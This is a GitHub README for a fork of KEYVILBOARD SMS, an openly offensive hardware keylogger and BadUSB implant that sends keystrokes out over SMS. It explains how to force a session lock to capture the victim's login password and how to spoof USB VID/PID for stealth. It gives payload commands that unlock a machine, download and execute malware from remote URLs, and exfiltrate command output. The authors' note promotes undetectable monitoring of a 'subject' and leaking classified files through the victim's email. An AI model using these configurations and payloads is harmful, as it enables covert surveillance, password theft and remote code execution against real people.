# KeyvilBoard SMS
This is a fork of the original Keyvilboard SMS version: [open link](https://github.com/RedBulletTooling/KEYVILBOARD)

| Reference | URL |
| --------- | --- |
| Github | [Github](https://github.com/RedBulletTooling/KEYVILBOARD) |
| Videos | [Video1](https://www.youtube.com/watch?v=Gzcc9Jt0PkE) |
| 	  | [Video2](https://www.youtube.com/watch?v=pDeoWyHRMHg) | 
| Home  | [home](https://keyvilboard.nl/en/) |


## Description
The KEYVILBOARD is a self-designed PCB of high quality with original parts that is made by hand in Holland. The modularity of the KEYVILBOARD makes it possible to attach any UART based chip. The software where the KEYVILBOARD runs on is entirely open-source and adjustable to your liking. This makes the KEYVILBOARD the most transparent, reliable and modulair solution to this date, making this a must-have for Cyber Security professionals around the globe.


## Specifications
The KEYVILBOARD SMS module is thé hardware keylogger for long during operations, once set into place it will send all keystrokes using SMS via your mobile network provider of choice.

**Key features:**
 - Unlimited action radius via mobile networks (2G only!)
 - Unlimited amount of characters
 - Support for all QWERTY keyboards
 - Support for remote key injection
 - Open-source software
 - Note: SIM card is not included. Is shipped with a clean undercover black case.

[![N|Solid](https://cldup.com/dTxpPi9lDf.thumb.png)](https://nodesource.com/products/nsolid)


## Functionality
1. Red SIM800L LED functionality:
	 - blinking every second - No Cell connection, or SIM not detected
	 - blinking every 3 segundos - Online 

2. Original firmware adds only US compatible keyboard layout. This fork is working on adding multi-language feature.
	It sends keys by time (interval) or SMS buffer full (140 chars.)

3. Smart keylogger features to capture login password.
	Modus operandi:  Insert keylogger device if user session is locked. You can configure it (LOCKPC in globals.h) to automatically lock user session. After inserting it the keylogger waits for user login to capture the password, recognizing it and sending it automatically by SMS.

4. Badusb feature with pre-installed, user defined, or SMS sent payloads.
   - This feature is independant and doesn't need a keyboard connected to the keylogger.
   - It includes a autorun payload option (AUTORUN in globals.h).
   
```
UnlockDownload##os##password##url    // Unlock the computer to download and execute malware
		[os: lnx, win, osx, winlnx, multi]
			Ex: UnlockDownload##lnx##password##url
		
UnlockRunAndExfil##os##password##command  // Unlock the computer to download and execute malware
		Ex: UnlockRunAndExfil##lnx##password##whoami
		
Manual##Action##Argument
		[Action=press,print,delay,release]
			Example: +CMT: Manuall##press##83 72 (in hex)
```

			
5. Automatic keyboard language layout gathering. This is a full new feature developped by Yago Hansen and is under testing now.

6. Serial port exfiltration feature: 
	- Every data or command output sent to the populated serial port on the destination system (/dev/tty... in Linux or COM port on Windows) will be sent to the running code and later to the SMS configured.

>**Warning (Note from the manufacturers): Only connect the keyboard after the KEYVILBOARD has been inserted into the USB port for a few seconds. Otherwise the keyboard and KEYVILBOARD WILL NOT work. This is due to a capacitor on the board that was added for stability. In my case, there wasn't any need of doing that, since it worked with my cabled keyboard, even if connecting it together.**


## Configuration
1. SIM Setup

* SIM Lock remove

     Make sure your remove the simlock from the simcard you intent to use in Module. Insert it in a phone/smartphone. Go to security menu and remove PIN inserting the actual one first.
  
* SIM Advice
  
     I reccomend you to take a unlimited texting subscription these will cost about 7-8 euro's a month monthly cancelable keep in mind these are trackable so dont be doing anything illigal with our modules.

* SIM Orientation

	![Look at the SIM corner](/extras/IMG_20190716_192137.jpg)
  

2. KEYVILBOARD Setup

* Arduino IDE
     
     The included code works with the arduino Leonardo bootloader. Make sure you download the Arduino IDE and you have a simple understand of how it works.
      
    Do not forget that flashing the firmware using Arduino IDE or the necessary binary needs to be ran on root user or adding your actual user to the dialup group in Linux. I do not use Windows, so DO NOT ASK about IT!


1. It's necessary to modify buffer size in Android library:

```
find . -name SoftwareSerial.h

 $ nano /opt/arduino-1.8.3/hardware/arduino/avr/libraries/SoftwareSerial/src/SoftwareSerial.h

/* NOTE: Make sure to edit SoftwareSerial.h to change
   #define _SS_MAX_RX_BUFF 64 // RX buffer size
   to
   #define _SS_MAX_RX_BUFF 256 // RX buffer size
   You need to set your info in globals.h
*/
```

2. Create your own configuration parameters editing globals.h

```
#define LEAK_PHONE_NUMBER "+34nnnnnnnnn"	// Set to the destination phone number
#define IMPLANT_NAME "KeyVL1"				// Identify device when multiple used			

#define BEACON true                // Un-comment to send beacons every BEACON_TIME 
#define KEYLOGGER true             // Un-comment to work also as keylogger (if commented, just work as badusb)
#define GETLANG true               // Un-comment to try to get keyboard language

//#define AUTORUN "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"   // Autorun script to be run on connect
#ifndef AUTORUN
  #define GETPASS true               // Un-comment to be smart and try to get user password after lock
  #define LOCKPC true                // Un-comment if you want to force lock when connecting to computer
#endif

#define DEBUG true                  // Un-comment if you want to build with DEBUG.
//#define DEBUGWITHOUTSIM true
// Use one of the following examples to debug without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
```

3. Optionally you can modify the device USB VID & PID to keep stealth. This hack will spoof the original device VID & PID (arduino leonardo) to spoof them with a fake one.
 - Select any manufacturer and device usb.ids [./extras/usb.ids][VID/PID list]. Write down your favourite VID & PID.
	
4. Modifying arduino device library (comment and copy the original VID/PID lines)
	For example, I will spoof VID 2341/PID 8036 (Arduino Leonardo) by VID 03f9/PID 0102 (Standard Keyboard)
    
```
nano /opt/arduino-1.8.3/hardware/arduino/avr/boards.txt
		#leonardo.vid.3=0x2A03
		#leonardo.pid.3=0x8036
		leonardo.vid.3=0x03f9
		leonardo.pid.3=0x0102

		#leonardo.build.vid=0x2341
		#leonardo.build.pid=0x8036
		#leonardo.build.usb_product="Arduino Leonardo"
		leonardo.build.board=AVR_LEONARDO
		leonardo.build.core=arduino
		leonardo.build.variant=leonardo
		leonardo.build.vid=0x03f9
		leonardo.build.pid=0x0102
		leonardo.build.usb_product="Standard Keyboard"
		#leonardo.build.board=AVR_MICRO
		#leonardo.build.core=micro
		#leonardo.build.variant=keyb
```

5. Revise file: payloads.cpp and replace VID_2341^&PID_8036 for VID_03f9^&PID_0102

6. Revise file: payloads.ccp and change *arduino* for *HIDPCD*

7. Exit Arduino IDE and re-enter. Verify and compile the project.

8. Flash the project again to the device.

9. Extract it and insert it again. Run:

```
$ dmesg

[12088.322618] usb 1-1: new full-speed USB device number 50 using xhci_hcd
[12088.467138] usb 1-1: New USB device found, idVendor=03f9, idProduct=0102
[12088.467149] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[12088.467156] usb 1-1: Product: Standard Keyboard
[12088.467162] usb 1-1: Manufacturer: Unknown
[12088.467167] usb 1-1: SerialNumber: HIDPCD
[12088.468629] cdc_acm 1-1:1.0: ttyACM0: USB ACM device
[12088.471630] input: Unknown Standard Keyboard as /devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1:1.2/0003:03F9:0102.001B/input/input42
[12088.531047] hid-generic 0003:03F9:0102.001B: input,hidraw0: USB HID v1.01 Keyboard [Unknown Standard Keyboard] on usb-0000:00:14.0-1/input2
```


## Flashing (verify, compile and upload)
It's important to kill ModemManager daemon in order to be able to flash the device.

```# killall ModemManager

Sketch uses 21834 bytes (76%) of program storage space. Maximum is 28672 bytes.
Global variables use 955 bytes (37%) of dynamic memory, leaving 1605 bytes for local variables. Maximum is 2560 bytes.
Forcing reset using 1200bps open/close on port /dev/ttyACM0
PORTS {/dev/ttyACM0, /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {}
PORTS {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {}
PORTS {/dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } / {/dev/ttyACM0, /dev/ttyUSB0, /dev/ttyUSB1, /dev/ttyUSB2, } => {/dev/ttyACM0, }
Found upload port: /dev/ttyACM0
/opt/arduino-1.8.3/hardware/tools/avr/bin/avrdude -C/opt/arduino-1.8.3/hardware/tools/avr/etc/avrdude.conf -v -patmega32u4 -cavr109 -P/dev/ttyACM0 -b57600 -D -Uflash:w:/tmp/arduino_build_515764/KEYVILBOARD.ino.hex:i 

avrdude: Version 6.3, compiled on Jan 17 2017 at 11:00:16
         Copyright (c) 2000-2005 Brian Dean, http://www.bdmicro.com/
         Copyright (c) 2007-2014 Joerg Wunsch

         System wide configuration file is "/opt/arduino-1.8.3/hardware/tools/avr/etc/avrdude.conf"
         User configuration file is "/root/.avrduderc"
         User configuration file does not exist or is not a regular file, skipping

         Using Port                    : /dev/ttyACM0
         Using Programmer              : avr109
         Overriding Baud Rate          : 57600
         AVR Part                      : ATmega32U4
         Chip Erase delay              : 9000 us
         PAGEL                         : PD7
         BS2                           : PA0
         RESET disposition             : dedicated
         RETRY pulse                   : SCK
         serial program mode           : yes
         parallel program mode         : yes
         Timeout                       : 200
         StabDelay                     : 100
         CmdexeDelay                   : 25
         SyncLoops                     : 32
         ByteDelay                     : 0
         PollIndex                     : 3
         PollValue                     : 0x53
         Memory Detail                 :

                                  Block Poll               Page                       Polled
           Memory Type Mode Delay Size  Indx Paged  Size   Size #Pages MinW  MaxW   ReadBack
           ----------- ---- ----- ----- ---- ------ ------ ---- ------ ----- ----- ---------
           eeprom        65    20     4    0 no       1024    4      0  9000  9000 0x00 0x00
           flash         65     6   128    0 yes     32768  128    256  4500  4500 0x00 0x00
           lfuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           hfuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           efuse          0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           lock           0     0     0    0 no          1    0      0  9000  9000 0x00 0x00
           calibration    0     0     0    0 no          1    0      0     0     0 0x00 0x00
           signature      0     0     0    0 no          3    0      0     0     0 0x00 0x00

         Programmer Type : butterfly
         Description     : Atmel AppNote AVR109 Boot Loader

Connecting to programmer: .
Found programmer: Id = "CATERIN"; type = S
    Software Version = 1.0; No Hardware Version given.
Programmer supports auto addr increment.
Programmer supports buffered memory access with buffersize=128 bytes.

Programmer supports the following devices:
    Device code: 0x44

avrdude: devcode selected: 0x44
avrdude: AVR device initialized and ready to accept instructions

Reading | ################################################## | 100% 0.00s

avrdude: Device signature = 0x1e9587 (probably m32u4)
avrdude: reading input file "/tmp/arduino_build_515764/KEYVILBOARD.ino.hex"
avrdude: writing flash (21834 bytes):

Writing | ################################################## | 100% 1.65s

avrdude: 21834 bytes of flash written
avrdude: verifying flash memory against /tmp/arduino_build_515764/KEYVILBOARD.ino.hex:
avrdude: load data flash data from input file /tmp/arduino_build_515764/KEYVILBOARD.ino.hex:
avrdude: input file /tmp/arduino_build_515764/KEYVILBOARD.ino.hex contains 21834 bytes
avrdude: reading on-chip flash data:

Reading | ################################################## | 100% 0.17s

avrdude: verifying ...
avrdude: 21834 bytes of flash verified

avrdude done.  Thank you.
```


## Note from the authors:
Explanation of Functions

> Code
     
     * The keylogging will be at all times persistence the subject will never notice anything different since that the modules are using a raw HID constant throughput no delay no change. We have even tested them while gaming and noticed no difference. Thanks to michalmonday for making this possible with his library.
     
     * The code contains some payload methods if you do not own the right to use those, don’t! These payload methods contain the possibility to execute any kind of evil keyboard style attack while also being smart. Since it captures the windows password if that password is enterd the wrong the first time your able to manually change it with the ManualPass: function. Everything after the ":" will be the password you can also change and implement these methods in diffrent ways and apply them to other login forms. With these modules you have a fully airgaped way of listening and an unlimited time vector for when to attack. 
     
     
     * The payload methods work by listing to text messages being send to the gsm module and containing certaint keywords. So for starting the example payload that is provided in the code you will send a text message to the module that says "Execute:Payload" once this string is received by the module and the subject hasn't typed for 15 seconds it will execute the payload. 
     
     * We are using 32kb atmega32u4 chips with the current code their is about 15kb left for additional payloads.
     
     * What makes this module extra cool is that is pretty much is smart keylogging although some passwords and usernames must be manually filled in with ManualPassword functions it makes it possible to exfill data threw a user’s own input. A cool proof on concept would be to send certaint files that are for instance classified threw the email of the subject itself. It's possible to all this without ever running any code on the system of the subject.
 
